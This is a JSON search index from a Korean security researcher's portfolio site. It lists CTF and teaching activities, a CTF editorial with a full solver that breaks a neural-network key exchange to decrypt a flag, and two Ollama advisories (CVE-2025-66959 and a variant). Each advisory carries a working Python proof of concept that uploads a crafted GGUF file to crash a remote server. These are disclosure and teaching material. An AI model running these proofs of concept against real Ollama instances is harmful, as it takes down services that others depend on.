[{"content":"2025 ASC Track Winter Operator 2025.01.06 - 2025.02.28\nDescription 침투 문제에 대한 강의자료와 문제를 구현하고 이를 전국 해킹방어 동아리원들이 학습하고 활동하는 ASC Track을 제작하였습니다.\nLLM Service, AI 보안에 대한 강의 자료를 제작하였으며, LLM 서비스를 구현해 safe tensor 취약점을 기저로한 침투문제를 제작했습니다.\nSkill AI Architecture LLM Service Development(front, back) AI Security LLM Security ","permalink":"https://zero.shotlearni.ng/activities/aisecurity/asctrack2025/","summary":"2025 ASC Track Winter Operator 2025.01.06 - 2025.02.28\nDescription 침투 문제에 대한 강의자료와 문제를 구현하고 이를 전국 해킹방어 동아리원들이 학습하고 활동하는 ASC Track을 제작하였습니다.\nLLM Service, AI 보안에 대한 강의 자료를 제작하였으며, LLM 서비스를 구현해 safe tensor 취약점을 기저로한 침투문제를 제작했습니다.\nSkill AI Architecture LLM Service Development(front, back) AI Security LLM Security ","title":""},{"content":"Team. ASC Club President 2024.01. - present Description Soongsil Univ. Hacking\u0026amp;Defense Club\nLINK ASC Notion\n","permalink":"https://zero.shotlearni.ng/activities/security/asc/","summary":"Team. ASC Club President 2024.01. - present Description Soongsil Univ. Hacking\u0026amp;Defense Club\nLINK ASC Notion","title":""},{"content":"2025 SSU CTF Operator 2025.01.25 10:00 - 18:00\nDescription 2025년 숭실대학교 해킹방어대회(2025 SSU CTF)를 기획하고, 운영하였습니다. 사업계획서부터, 문제 출제 및 운영까지 대회 총괄을 맡았습니다. 숭실대학교 SW사업단과 Hspace의 후원을 받아 진행하였습니다.\n참가인원은 142팀 (3인 내 구성 1팀) , 대학부와 일반부 구분으로 진행되었습니다.\npyjail(misc) 과 check the target(aisec, misc) 문제를 출제하였습니다.\nLINK 숭실대학교 해킹방어대회 onoffmix\n","permalink":"https://zero.shotlearni.ng/activities/security/ssuctf2025/","summary":"2025 SSU CTF Operator 2025.01.25 10:00 - 18:00\nDescription 2025년 숭실대학교 해킹방어대회(2025 SSU CTF)를 기획하고, 운영하였습니다. 사업계획서부터, 문제 출제 및 운영까지 대회 총괄을 맡았습니다. 숭실대학교 SW사업단과 Hspace의 후원을 받아 진행하였습니다.\n참가인원은 142팀 (3인 내 구성 1팀) , 대학부와 일반부 구분으로 진행되었습니다.\npyjail(misc) 과 check the target(aisec, misc) 문제를 출제하였습니다.\nLINK 숭실대학교 해킹방어대회 onoffmix","title":""},{"content":"Do Not Posted Yet Thx for your Attention. Description 아직 작성되지 않은 페이지 입니다.\n빠른 시일내에 작성될 예정이오니 양해 바랍니다.\n감사합니다.\nContact [\u0026gt;] About Page\n","permalink":"https://zero.shotlearni.ng/donotpostedyet/","summary":"Do Not Posted Yet Thx for your Attention. Description 아직 작성되지 않은 페이지 입니다.\n빠른 시일내에 작성될 예정이오니 양해 바랍니다.\n감사합니다.\nContact [\u0026gt;] About Page","title":""},{"content":"ACSC2025 CTF 문제 출제 외주 2025.08.16 - 2025.08.17 Job Description CTF 문제 출제 CTF 대회의 문제 출제 중 일부분을 맡았습니다. Misc 파트의 AI Security 문제 2문제를 제작하였습니다.\nSynchronized Silence (Medium) JustOnnx (Hard) Ability Cryptography AI Security ","permalink":"https://zero.shotlearni.ng/workexperience/acsc2025operator/","summary":"ACSC2025 CTF 문제 출제 외주 2025.08.16 - 2025.08.17 Job Description CTF 문제 출제 CTF 대회의 문제 출제 중 일부분을 맡았습니다. Misc 파트의 AI Security 문제 2문제를 제작하였습니다.\nSynchronized Silence (Medium) JustOnnx (Hard) Ability Cryptography AI Security ","title":""},{"content":"데이원컴퍼니 Instructor 2024.12.09 – 2024.12.30 Job Description Skill-up 데이터분석 MASTER CLASS - Python Skill-up 데이터분석 MASTER CLASS - Python 과정의 문제를 출제하였습니다. 1~25차시에 해당하는 내용의 문제를 출제하였으며, 해당 차시 내의 실습, 연습, 평가 문제를 출제하였습니다.\nAbility Python beginner Python Basic Matplotlib Seaborn Pandas Crawling EDA RFM Analysis DAU Map Visualization ","permalink":"https://zero.shotlearni.ng/workexperience/dayoneinstructor/","summary":"데이원컴퍼니 Instructor 2024.12.09 – 2024.12.30 Job Description Skill-up 데이터분석 MASTER CLASS - Python Skill-up 데이터분석 MASTER CLASS - Python 과정의 문제를 출제하였습니다. 1~25차시에 해당하는 내용의 문제를 출제하였으며, 해당 차시 내의 실습, 연습, 평가 문제를 출제하였습니다.\nAbility Python beginner Python Basic Matplotlib Seaborn Pandas Crawling EDA RFM Analysis DAU Map Visualization ","title":""},{"content":"Stealien CTF 문제 출제 외주 2023.09.18 – 2023.10.20 Job Description CTF 문제 출제 CTF 대회의 문제 출제 중 일부분을 맡았습니다. Crypto 문제를 제작하였습니다.\nAbility cryptography ","permalink":"https://zero.shotlearni.ng/workexperience/stealienta/","summary":"Stealien CTF 문제 출제 외주 2023.09.18 – 2023.10.20 Job Description CTF 문제 출제 CTF 대회의 문제 출제 중 일부분을 맡았습니다. Crypto 문제를 제작하였습니다.\nAbility cryptography ","title":""},{"content":"CSEC. Soongsil Univ. Undergraduate Researcher 2023.07 – present Job Description 국방 AI 보안 사업 진행 타겟 모델을 설정하여 white box 환경과 black box 환경에서의 모델의 취약성을 분석하고 공격했습니다. 또 방어 기법을 연구하여, 모델 취약성 분석 및 방어 프레임워크를 제작했습니다.\n해당 사업을 기반으로 학회지(우수논문상), 논문, 국내특허, 해외특허(PCT심사)의 결과물을 산출하였습니다.\nLLM Redteaming LLM 을 타겟으로 Adversarial Prompt 및 Jail Break 등 실제 LLM 서비스를 침투하기위한 red teaming을 연구중입니다.\nAbility Data Preprocess NLP Computer Vision Document Handling ","permalink":"https://zero.shotlearni.ng/workexperience/undergraduateresearcher/","summary":"CSEC. Soongsil Univ. Undergraduate Researcher 2023.07 – present Job Description 국방 AI 보안 사업 진행 타겟 모델을 설정하여 white box 환경과 black box 환경에서의 모델의 취약성을 분석하고 공격했습니다. 또 방어 기법을 연구하여, 모델 취약성 분석 및 방어 프레임워크를 제작했습니다.\n해당 사업을 기반으로 학회지(우수논문상), 논문, 국내특허, 해외특허(PCT심사)의 결과물을 산출하였습니다.\nLLM Redteaming LLM 을 타겟으로 Adversarial Prompt 및 Jail Break 등 실제 LLM 서비스를 침투하기위한 red teaming을 연구중입니다.\nAbility Data Preprocess NLP Computer Vision Document Handling ","title":""},{"content":"TL; DR Tree Parity Machine(TPM)을 이용해 AES 키를 공개 채널에서 학습 동기화로 생성한 뒤, 암호화된 플래그를 제공하는 문제다. 로그(log.json)를 기반으로 TPM weight를 재현하고, SHA256으로 키를 유도해 enc_flag.txt를 복호화하면 된다. naive한 단일 TPM imitation으로는 풀리지 않으며, population attack, mutation, selective unit flipping을 활용해 풀이 가능하다.\n문제 구조 log.json: TPM 학습 로그. 각 step의 입력 벡터(x: 3x100)와 출력 bit(tau: {-1, +1})가 주어짐. 단, Alice와 Bob이 tau^A = tau^B일 때만 기록됨. enc_flag.txt: AES-ECB로 암호화된 플래그. implementation.py : 구조체 README.md : 걍 시나리오, 목표 출제의도 TPM은 neural cryptography에서 양측이 키를 공유하는 방식이다. 학습 기반 키 교환이 비동기적으로 이루어지고, 공개된 채널에서 이뤄진다는 점이 매력 적이지만, 공격자의 입장에서 동기화된 키를 재현가능 함.\n해당 문제는 4가지의 근복적 취약점이 있다\n출력 공개 동기식 업데이트 (weight 경로의 결정성) 상태공간의 유한성 학습 규칙의 공개 취약점 분석 1. Tree Parity Machine(TPM)의 형식적 정의 구조\n은닉층 뉴런 K=3 각 뉴런 입력 차원 N=100 가중치 범위 $w_{k,j}\\in{-L,\\dots,L},;L=3$ 국소장(local field)\n$h_k(t)=\\sum_{j=1}^{N}w_{k,j}(t),x_{k,j}(t),\\qquad \\sigma_k(t)=\\operatorname{sgn}!\\bigl(h_k(t)\\bigr)$\n(0은 +1로 치환)\n출력 비트\n$\\tau(t)=\\prod_{k=1}^{K}\\sigma_k(t)\\in{-1,+1}$\n이 값만이 공개 채널을 통해 누설된다.\nHebbian 학습 규칙\n$w_{k,j}(t+1)=g!\\Bigl(w_{k,j}(t)+\\sigma_k(t),x_{k,j}(t),\\Theta!\\bigl(\\sigma_k(t)\\tau(t)\\bigr)\\Bigr)$\n여기서 $g(\\cdot)$는 범위를 자르는 함수이고 $\\Theta$는 부호 일치 여부(0/1) 지시자다 .\n2. 출력 공개 공격자가 시퀀스\n$\\bigl{x(t),\\tau(t)\\bigr}{t=1}^{T}$\n를 얻을 때, 한 스텝에서 숨겨진 $\\sigma_k$ 3비트 중 알려지는 정보량은 1 bit뿐이다.\n엔트로피 관점에서\n$H\\bigl(\\sigma_1,\\sigma_2,\\sigma_3\\bigr)=3 ,\\qquad H\\bigl(\\sigma_1,\\sigma_2,\\sigma_3\\mid\\tau)=2$\n즉 한 스텝당 1 bit가 그대로 남는다. 스텝의 로그는\n$I{\\text{leak}} = T\\text{ bit}$\n을 노출하며, 이는 가중치 공간\n$(2L+1)^{KN}=7^{300}$\n에 비하면 작지만 selection-filtering 과 결합될 때 치명적이다.\n3. Population Attack 초기화 $n_0$개의 후보 가중치 벡터 ${W_i^{(0)}}$를 무작위로 뽑음\n필터 단계\n$P_{t+1}= \\Bigl{,g\\bigl(W_i^{(t)},x(t),\\tau(t)\\bigr);|;\\tau\\bigl(W_i^{(t)},x(t)\\bigr)=\\tau(t)\\Bigr}$\n여기서 g는 Hebbian update 연산.\n크기 기대값\n각 스텝의 생존 확률은\n$p_{\\text{match}}(t)=\\Pr\\bigl[\\tau(W,x)=\\tau(t)\\bigr]\\approx\\frac12\\bigl(1+\\epsilon_t\\bigr)$\n(무작위 가중치면 $\\epsilon_t\\approx0$)\n따라서\n$\\mathbb E!\\bigl[|\\mathcal P_{t}|\\bigr]=n_0,\\prod_{s=1}^{t-1}p_{\\text{match}}(s)$\n로그 길이가 충분하면 $|\\mathcal P_{t}|\\to0$ → 실패. 이를 선택적 플립과 돌연변이로 보완\n4. Selective Unit Flipping 공격자가 $\\tau_{\\text{pred}}\\neq\\tau$인 스텝에서\n$k^\\ast = \\arg\\min_k \\left| h_k \\right|$\n을 찾아 $\\sigma_{k^\\ast} \\leftarrow -\\sigma_{k^\\ast}$ 로 강제 전환하면 새 출력 **$\\tau’ = -\\tau_{\\text{pred}}$\n즉 정확히 한 비트 반전으로 불일치 해소가 가능할 확률은\n$P_{\\text{flip}} = \\Pr\\left[ \\operatorname{sgn}(h_{k^\\ast}) \\neq 0 \\right] \\approx 1$\n(국소장이 0이면 이미 $\\tau$ 일치였음).\n필터 손실을 $O(1)$로 줄여 $|\\mathcal P_t|$ 붕괴를 방지 가능함\n5. Mutation Strategy 필터+플립에도 집단 다양성이 급감하면 탐색이 지수적으로 느려진다.\n이를 해결하기 위해 남은 개체 W마다\n$W’;=;W+\\Delta W,\\qquad \\Delta W_{k,j}\\sim{-1,0,+1}$\n를 확률 $p_m$로 삽입, 전이 행렬 M을 두면\n$\\mathbf n_{t+1}= \\mathbf n_t P_{\\text{filter}} + \\mathbf n_t M$\nM이 가중치 랜덤 워크를 부여하여 마코프 체인의 미소 공간 접근성을 보장\n6. 공격 성공 확률 \u0026amp; 시간 복잡도 $P_{\\text{sync}}^{\\text{Eve}}(T)\\approx1-\\exp!\\bigl(-\\alpha,T/n_0\\bigr)$, $\\alpha\\propto\\frac{1}{(2L+1)^N}$\n동일 파라미터에서 50 k 개체, 10 k 스텝이면 $P_{\\text{sync}}\\to0.9$ 수준\n연산량은 GPU 없이도 수 분–수십 분 내 실행 가능\n$O(n_0 K N T)\\approx 5!\\times!10^4\\cdot3\\cdot100\\cdot10^4\\approx1.5!\\times!10^{9}$\n7. 키 파생 공식 가중치 행렬 W를 시프트 \u0026amp; 3진법 인코딩 → 비트열 $b$ →\n$K_{\\text{AES}}=\\operatorname{Trunc}_{128}!\\Bigl(\\operatorname{SHA256}\\bigl(\\mathbf b\\bigr)\\Bigr)$\n이는 가중치 1 bit라도 틀리면 해시가 전혀 달라지므로 공격자에게 완전체 동기화를 강제.\n솔버 위 수식들 기반으로 솔버 작성하면\nimport json import numpy as np from Crypto.Cipher import AES import hashlib import random K, N, L = 3, 100, 3 psize = 50000 b = [-1, 0, 1] mthreshold = 100 mfactor = psize // 5 def tpm_output(w, x): dot = np.einsum(\u0026#39;ij,ij-\u0026gt;i\u0026#39;, w, x) sig = np.sign(dot) sig[sig == 0] = 1 tau = np.prod(sig) return tau, sig, dot def update_weights(w, x, sig, tau): for i in range(K): if sig[i] == tau: w[i] += x[i] w[i] = np.clip(w[i], -L, L) return w def weight_to_aes_key(w): bits = \u0026#39;\u0026#39;.join(f\u0026#39;{(v + L):03b}\u0026#39; for v in w.flatten()) b = int(bits, 2).to_bytes((len(bits) + 7) // 8, byteorder=\u0026#39;big\u0026#39;) return hashlib.sha256(b).digest()[:16] def load(): with open(\u0026#34;log.json\u0026#34;) as f: log = json.load(f) with open(\u0026#34;enc_flag.txt\u0026#34;, \u0026#34;rb\u0026#34;) as f: ct = f.read() return log, ct def biased_init(): return np.random.choice(b, size=(K, N)) def mutate(w, strength=1): mutation = np.random.randint(-strength, strength + 1, size=w.shape) return np.clip(w + mutation, -L, L) def population_attack(): log, ct = load() population = [biased_init() for _ in range(psize)] for t, entry in enumerate(log): x = np.array(entry[\u0026#39;x\u0026#39;]) tau_true = entry[\u0026#39;tau\u0026#39;] new_pop = [] for w in population: tau_pred, sig, dot = tpm_output(w, x) if tau_pred == tau_true: new_pop.append(update_weights(w.copy(), x, sig, tau_true)) else: i_star = np.argmin(np.abs(dot)) sig[i_star] *= -1 tau_flip = np.prod(sig) if tau_flip == tau_true: new_pop.append(update_weights(w.copy(), x, sig, tau_true)) population = new_pop print(f\u0026#34;[Step {t:03d}] Population: {len(population)}\u0026#34;) if len(population) == 0: print(\u0026#34;[-] nono \u0026#34;) return if len(population) \u0026lt; mthreshold: print(f\u0026#34;[*] Low survivors ({len(population)}), mutating...\u0026#34;) survivors = population.copy() population = [] for w in survivors: for _ in range(mfactor // max(1, len(survivors))): population.append(mutate(w, strength=1)) print(f\u0026#34;[*]New population after mutation: {len(population)}\u0026#34;) print(f\u0026#34;[*]{len(population)} survivors. Trying AES decryption...\u0026#34;) for w in population: key = weight_to_aes_key(w) pt = AES.new(key, AES.MODE_ECB).decrypt(ct) if b\u0026#34;acsc{\u0026#34; in pt: print(pt.decode(errors=\u0026#34;ignore\u0026#34;)) return if __name__ == \u0026#34;__main__\u0026#34;: population_attack() ","permalink":"https://zero.shotlearni.ng/blog/acsc2025synchronized-silence-editorial-of-operator/","summary":"TL; DR Tree Parity Machine(TPM)을 이용해 AES 키를 공개 채널에서 학습 동기화로 생성한 뒤, 암호화된 플래그를 제공하는 문제다. 로그(log.json)를 기반으로 TPM weight를 재현하고, SHA256으로 키를 유도해 enc_flag.txt를 복호화하면 된다. naive한 단일 TPM imitation으로는 풀리지 않으며, population attack, mutation, selective unit flipping을 활용해 풀이 가능하다.\n문제 구조 log.json: TPM 학습 로그. 각 step의 입력 벡터(x: 3x100)와 출력 bit(tau: {-1, +1})가 주어짐. 단, Alice와 Bob이 tau^A = tau^B일 때만 기록됨. enc_flag.txt: AES-ECB로 암호화된 플래그.","title":"[ACSC2025]Synchronized Silence Editorial of Operator"},{"content":"Severity Score : 7.5 / 10\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nSummary A remote unauthenticated Denial of Service exists in the GGUF decoder. When creating a model from a crafted GGUF blob, the server panics with panic: runtime error: makeslice: len out of range and terminates.\nDetails (root cause) In fs/ggml/gguf.go::readGGUFString, the code reads 8 bytes as a length and immediately allocates a slice of that length:\nfunc readGGUFString(llm *gguf, r io.Reader) (string, error) { if llm.Version == 1 { return readGGUFV1String(llm, r) } buf := llm.scratch[:8] _, err := io.ReadFull(r, buf) if err != nil { return \u0026#34;\u0026#34;, err } length := int(llm.ByteOrder.Uint64(buf)) if length \u0026gt; len(llm.scratch) { buf = make([]byte, length) } else { buf = llm.scratch[:length] } clear(buf) _, err = io.ReadFull(r, buf) if err != nil { return \u0026#34;\u0026#34;, err } return string(buf), nil } There is no maximum bound and no overflow guard before make([]byte, length). Malicious GGUF metadata triggers makeslice: len out of range -\u0026gt; process crash.\nPoC import os, sys, time, json, argparse, hashlib, requests from uuid import uuid1 for k in (\u0026#34;HTTP_PROXY\u0026#34;,\u0026#34;HTTPS_PROXY\u0026#34;,\u0026#34;http_proxy\u0026#34;,\u0026#34;https_proxy\u0026#34;): os.environ.pop(k, None) def sha256_file(path): h = hashlib.sha256() with open(path, \u0026#34;rb\u0026#34;) as f: for chunk in iter(lambda: f.read(1\u0026lt;\u0026lt;20), b\u0026#34;\u0026#34;): h.update(chunk) return h.hexdigest() def main(): ap = argparse.ArgumentParser() ap.add_argument(\u0026#34;--base\u0026#34;, required=True, help=\u0026#34;http://127.0.0.1:11434\u0026#34;) ap.add_argument(\u0026#34;--poc\u0026#34;, required=True, help=\u0026#34;path to malicious GGUF (e.g., ./fail_ggml.bin)\u0026#34;) ap.add_argument(\u0026#34;--name\u0026#34;, default=None, help=\u0026#34;model name (default: test-\u0026lt;uuid\u0026gt;)\u0026#34;) args = ap.parse_args() base = args.base.rstrip(\u0026#34;/\u0026#34;) poc = args.poc name = args.name or f\u0026#34;test-{uuid1()}\u0026#34; dgst = sha256_file(poc) blob_url = f\u0026#34;{base}/api/blobs/sha256:{dgst}\u0026#34; print(f\u0026#34;[*] Base : {base}\u0026#34;) print(f\u0026#34;[*] PoC : {poc}\u0026#34;) print(f\u0026#34;[*] Model : {name}\u0026#34;) print(f\u0026#34;[*] SHA256 : {dgst}\u0026#34;) with open(poc, \u0026#34;rb\u0026#34;) as f: r = requests.post(blob_url, data=f, timeout=60) print(\u0026#34;[+] upload -\u0026gt;\u0026#34;, r.status_code, r.text[:200]) r = requests.head(blob_url, timeout=10) print(\u0026#34;[+] HEAD blob -\u0026gt;\u0026#34;, r.status_code) create_url = f\u0026#34;{base}/api/create\u0026#34; body = { \u0026#34;model\u0026#34;: name, \u0026#34;files\u0026#34;: { \u0026#34;malicious.gguf\u0026#34;: f\u0026#34;sha256:{dgst}\u0026#34; }, \u0026#34;stream\u0026#34;: False } r = requests.post(create_url, json=body, timeout=120) print(\u0026#34;[+] create -\u0026gt;\u0026#34;, r.status_code, r.text[:200]) try: chat_url = f\u0026#34;{base}/api/chat\u0026#34; payload = { \u0026#34;model\u0026#34;: name, \u0026#34;messages\u0026#34;: [{\u0026#34;role\u0026#34;:\u0026#34;user\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;ping?\u0026#34;}], \u0026#34;stream\u0026#34;: False } r = requests.post(chat_url, json=payload, timeout=60) print(\u0026#34;[+] chat -\u0026gt;\u0026#34;, r.status_code, r.text[:200]) except requests.RequestException as e: print(\u0026#34;[!] chat exception:\u0026#34;, e) if __name__ == \u0026#34;__main__\u0026#34;: main() in attacker log : [ * ] Base : http://127.0.0.1:11434\n[ * ] PoC : ./fail_ggml.bin\n[ * ] Model : test-28fe4f96-bc44-11f0-be85-a0423f603d40\n[ * ] SHA256 : ddf343c3f2e1fe63b124d83a354b1c4bf0e1d365e7e0454bf0092bc469cf8eb5\n[+] upload -\u0026gt; 201\n[+] HEAD blob -\u0026gt; 200\nclick to : malice model Link\nImpact Availability loss (DoS). Any instance exposing /api/blobs + /api/create to untrusted clients is affected.\nCVSS v3.1 7.5 (High) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H.\nCVE Info About MITRE e-mail \u0026gt; [Suggested description] \u0026gt; An issue in ollama v.0.12.10 allows a remote attacker to cause a denial \u0026gt; of service via the GGUF decoder \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Additional Information] \u0026gt; CVE-2025-0312: NULL deref; This case: Panic during slice creation due to lack of length/integer validation \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Vulnerability Type] \u0026gt; Integer Overflow \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Vendor of Product] \u0026gt; https://github.com/ollama/ollama \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Affected Product Code Base] \u0026gt; github.com/ollama/ollama/fs/ggml/gguf.go - \u0026lt;=v.0.12.10 not fixed yet \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Affected Component] \u0026gt; github.com/ollama/ollama/fs/ggml/gguf.go, readGGUFString,\u0026lt;=v0.12.10 \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Attack Type] \u0026gt; Remote \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Impact Denial of Service] \u0026gt; true \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Attack Vectors] \u0026gt; A remote unauthenticated Denial of Service exists in the GGUF decoder. When creating a model from a crafted GGUF blob, the server panics with panic: runtime error: makeslice: len out of range and terminates. \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Reference] \u0026gt; https://nvd.nist.gov/vuln/detail/CVE-2025-0312 \u0026gt; https://nvd.nist.gov/vuln/detail/CVE-2025-0315 \u0026gt; https://nvd.nist.gov/vuln/detail/CVE-2025-0317 \u0026gt; https://github.com/ollama/ollama/issues/9820? \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Discoverer] \u0026gt; kimh \u0026gt; \u0026gt; Use CVE-2025-66959. ","permalink":"https://zero.shotlearni.ng/blog/cve-2025-66959panic-dos-via-unchecked-length-in-gguf-decoder-copy/","summary":"Severity Score : 7.5 / 10\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nSummary A remote unauthenticated Denial of Service exists in the GGUF decoder. When creating a model from a crafted GGUF blob, the server panics with panic: runtime error: makeslice: len out of range and terminates.\nDetails (root cause) In fs/ggml/gguf.go::readGGUFString, the code reads 8 bytes as a length and immediately allocates a slice of that length:\nfunc readGGUFString(llm *gguf, r io.Reader) (string, error) { if llm.","title":"[CVE-2025-66959]panic DoS via unchecked length in GGUF decoder"},{"content":"Severity Score : 7.5 / 10\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nSummary A remote unauthenticated Denial-of-Service exists in Ollama’s GGUF decoder.\nWhen a crafted GGUF file is uploaded and used during model creation, the server panics and terminates.\nKey signature\npanic: bytes.Buffer: truncation out of range stack: readGGUFV1String → readGGUFString → (*gguf).Decode → server.(*Server).Create… This affects the REST path /api/blobs (upload) + /api/create (files map) and brings down the process.\nDetails(root cause) In fs/ggml/gguf.go, function readGGUFV1String reads a string length from untrusted GGUF metadata and later ends up calling bytes.(*Buffer).Truncate(n) where n is derived from that untrusted length without sufficiently validating bounds (e.g., 0 ≤ n ≤ buf.Len()), maximum size, or integer conversion overflow. As a result, the server panics:\npanic: bytes.Buffer: truncation out of range bytes.(*Buffer).Truncate(…) github.com/ollama/ollama/fs/ggml.readGGUFV1String (gguf.go:293) github.com/ollama/ollama/fs/ggml.readGGUFString (gguf.go:335) github.com/ollama/ollama/fs/ggml.(*gguf).Decode github.com/ollama/ollama/fs/ggml.(*containerGGUF).Decode github.com/ollama/ollama/fs/ggml.Decode github.com/ollama/ollama/server.(*Server).Create… This is a variant of the “length/offset validation missing” class (previously seen as makeslice: len out of range) but here it is bytes.Buffer.Truncate on the v1 path.\nPoC import os, sys, time, argparse, hashlib, requests, json from uuid import uuid4 for k in (\u0026#34;HTTP_PROXY\u0026#34;,\u0026#34;HTTPS_PROXY\u0026#34;,\u0026#34;http_proxy\u0026#34;,\u0026#34;https_proxy\u0026#34;): os.environ.pop(k, None) def sha256_file(p): h = hashlib.sha256() with open(p, \u0026#34;rb\u0026#34;) as f: for ch in iter(lambda: f.read(1\u0026lt;\u0026lt;20), b\u0026#34;\u0026#34;): h.update(ch) return h.hexdigest() def wait_ready(base, timeout=10): t0 = time.time() while time.time() - t0 \u0026lt; timeout: try: r = requests.get(f\u0026#34;{base}/api/version\u0026#34;, timeout=2) if r.ok: return True except requests.RequestException: pass time.sleep(0.5) return False def main(): ap = argparse.ArgumentParser(description=\u0026#34;Ollama GGUF DoS PoC (/api/blobs + /api/create)\u0026#34;) ap.add_argument(\u0026#34;--base\u0026#34;, required=True, help=\u0026#34;ex) http://127.0.0.1:11434\u0026#34;) ap.add_argument(\u0026#34;--poc\u0026#34;, required=True, help=\u0026#34;path to malicious GGUF (ex. repro_gguf_v1_trunc32.bin)\u0026#34;) ap.add_argument(\u0026#34;--name\u0026#34;, default=None, help=\u0026#34;model name (default: random)\u0026#34;) ap.add_argument(\u0026#34;--chat\u0026#34;, action=\u0026#34;store_true\u0026#34;, help=\u0026#34;force loading via /api/chat after create\u0026#34;) args = ap.parse_args() base = args.base.rstrip(\u0026#34;/\u0026#34;) model = args.name or f\u0026#34;crash-{uuid4()}\u0026#34; poc = args.poc print(f\u0026#34;[*] Base : {base}\u0026#34;) print(f\u0026#34;[*] Model : {model}\u0026#34;) print(f\u0026#34;[*] PoC : {poc}\u0026#34;) print(\u0026#34;[*] waiting server /api/version ...\u0026#34;) if not wait_ready(base, timeout=10): print(\u0026#34;[!] server not ready (no /api/version). continue anyway...\u0026#34;) dgst = sha256_file(poc) print(f\u0026#34;[*] SHA256 : {dgst}\u0026#34;) with open(poc, \u0026#34;rb\u0026#34;) as f: r = requests.post(f\u0026#34;{base}/api/blobs/sha256:{dgst}\u0026#34;, data=f, timeout=30) print(f\u0026#34;[+] upload -\u0026gt; {r.status_code}\u0026#34;) try: h = requests.head(f\u0026#34;{base}/api/blobs/sha256:{dgst}\u0026#34;, timeout=5) print(f\u0026#34;[+] HEAD blob -\u0026gt; {h.status_code}\u0026#34;) except requests.RequestException as e: print(f\u0026#34;[!] HEAD failed: {e}\u0026#34;) create_body = { \u0026#34;model\u0026#34;: model, \u0026#34;files\u0026#34;: { \u0026#34;malicious.gguf\u0026#34;: f\u0026#34;sha256:{dgst}\u0026#34; }, \u0026#34;stream\u0026#34;: False } try: r = requests.post(f\u0026#34;{base}/api/create\u0026#34;, json=create_body, timeout=60) print(f\u0026#34;[+] create -\u0026gt; {r.status_code} {r.text[:200]!r}\u0026#34;) except requests.RequestException as e: print(f\u0026#34;[!] create exception: {type(e).__name__}: {e}\u0026#34;) if args.chat: try: payload = {\u0026#34;model\u0026#34;: model, \u0026#34;messages\u0026#34;:[{\u0026#34;role\u0026#34;:\u0026#34;user\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;ping?\u0026#34;}], \u0026#34;stream\u0026#34;: False} c = requests.post(f\u0026#34;{base}/api/chat\u0026#34;, json=payload, timeout=30) print(f\u0026#34;[+] chat -\u0026gt; {c.status_code} {c.text[:200]!r}\u0026#34;) except requests.RequestException as e: print(f\u0026#34;[!] chat exception: {type(e).__name__}: {e}\u0026#34;) try: ok = requests.get(f\u0026#34;{base}/api/version\u0026#34;, timeout=3).ok except requests.RequestException: ok = False if __name__ == \u0026#34;__main__\u0026#34;: main() Observed: server console prints panic: bytes.Buffer: truncation out of range with stack above and process terminates (subsequent /api/version fails).\nExpected: the server should reject invalid GGUF with an error, not panic.\nattacker cli:\n[ * ] Base : http://127.0.0.1:11534\n[ * ] Model : crash-51aef8f7-fde7-4580-b588-bf410d32c4bc\n[ * ] PoC : repro_gguf_v1_trunc32.bin\n[ * ] waiting server /api/version \u0026hellip;\n[ * ] SHA256 : 9e7fc09c33c36040c00f9f76760a6d524395ef530d2271eb50681b5ecfe6532d\n[ + ] upload -\u0026gt; 201\n[ + ] HEAD blob -\u0026gt; 200\nclick to : malice bin url\nImpact Availability loss: any instance exposing /api/blobs + /api/create to untrusted clients can be brought down.\nCVE Info About MITRE e-mail \u0026gt; [Suggested description] \u0026gt; An issue in ollama v.0.12.10 allows a remote attacker to cause a denial \u0026gt; of service via the fs/ggml/gguf.go, function readGGUFV1String reads a \u0026gt; string length from untrusted GGUF metadata \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Additional Information] \u0026gt; CVE-2025-0312: NULL deref; This case: Panic during slice creation due to lack of length/integer validation \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Vulnerability Type] \u0026gt; Integer Overflow \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Vendor of Product] \u0026gt; https://github.com/ollama/ollama \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Affected Product Code Base] \u0026gt; github.com/ollama/ollama/fs/ggml/gguf.go - \u0026lt;=v.0.12.10 not fixed yet \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Affected Component] \u0026gt; github.com/ollama/ollama/fs/ggml/gguf.go, readGGUFV1String,\u0026lt;=v0.12.10 \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Attack Type] \u0026gt; Remote \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Impact Denial of Service] \u0026gt; true \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Attack Vectors] \u0026gt; When a crafted GGUF file is uploaded and used during model creation, the server panics and terminates. \u0026gt; Key signature \u0026gt; \u0026gt; panic: bytes.Buffer: truncation out of range \u0026gt; stack: readGGUFV1String ? readGGUFString ? (*gguf).Decode ? server.(*Server).Create \u0026gt; This affects the REST path /api/blobs (upload) + /api/create (files map) and brings down the process. \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Reference] \u0026gt; https://nvd.nist.gov/vuln/detail/CVE-2025-0312 \u0026gt; https://nvd.nist.gov/vuln/detail/CVE-2025-0315 \u0026gt; https://nvd.nist.gov/vuln/detail/CVE-2025-0317 \u0026gt; 